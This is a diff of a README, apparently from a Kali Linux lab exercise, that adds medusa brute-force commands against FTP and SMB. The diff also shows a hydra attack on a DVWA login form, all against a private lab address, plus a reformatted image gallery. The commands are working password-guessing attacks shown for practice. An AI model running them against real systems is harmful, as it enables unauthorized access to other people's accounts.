@@ -42,17 +42,17 @@ medusa -h 192.168.1.16 -U wordlists/simples_usernames.txt -P wordlists/simples_p
 
 hydra -l admin -P wordlists/simples_passwords.txt 192.168.1.16 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=incorrect"
 
+
+medusa -h 192.168.1.16 -u msfadmin -P wordlists/simples_passwords.txt -M ftp -t 4 -f -O results/medusa_ftp.txt
+
+medusa -h 192.168.1.16 -U wordlists/simples_usernames.txt -P wordlists/simples_passwords.txt -M smb -t 8 -f -O results/medusa_smb.txt
+
+
 Imagens do Projeto
 
 
+<p align="center"> <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem1.PNG" width="170" alt="Página Inicial 1"> <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem2.png" width="170" alt="Página Inicial 2"> <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem3.png" width="170" alt="Página Inicial 3"> <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem4.png" width="170" alt="Página Inicial 4"> <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem5.png" width="170" alt="Página Inicial 5"> </p> ```
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem1.PNG" width="170" alt="Página Inicial 1">
-  <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem2.png" width="170" alt="Página Inicial 2">
-  <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem3.png" width="170" alt="Página Inicial 3">
-  <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem4.png" width="170" alt="Página Inicial 4">
-  <img src="https://raw.githubusercontent.com/marceloguilherme100/desafio-medusa-kali/main/imagem5.png" width="170" alt="Página Inicial 5">
-</p>
 
 
 
